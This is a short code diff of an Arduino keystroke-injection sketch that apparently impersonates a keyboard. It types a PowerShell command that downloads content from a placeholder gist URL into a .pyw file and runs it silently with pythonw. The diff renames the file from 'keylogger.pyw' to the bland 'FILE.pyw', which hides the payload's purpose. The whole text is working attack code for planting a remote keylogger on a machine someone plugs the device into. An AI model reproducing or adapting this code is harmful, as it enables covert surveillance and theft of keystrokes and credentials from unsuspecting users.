@@ -30,7 +30,7 @@ void setup() {
  
   Keyboard.print("Invoke-WebRequest -Uri \"YOUR_GIST_FILE\" ");
   Keyboard.print("| Select-Object -ExpandProperty Content ");
-  Keyboard.print("| Out-File -Encoding utf8 -Append keylogger.pyw");
+  Keyboard.print("| Out-File -Encoding utf8 -Append FILE.pyw");
   delay(500);
   Keyboard.press(KEY_RETURN);
   Keyboard.release(KEY_RETURN);
@@ -38,7 +38,7 @@ void setup() {
   delay(5000); 
 
  
-  typeAndEnter("pythonw keylogger.pyw", 1000);
+  typeAndEnter("pythonw FILE.pyw", 1000);
 
   Keyboard.end();
 }
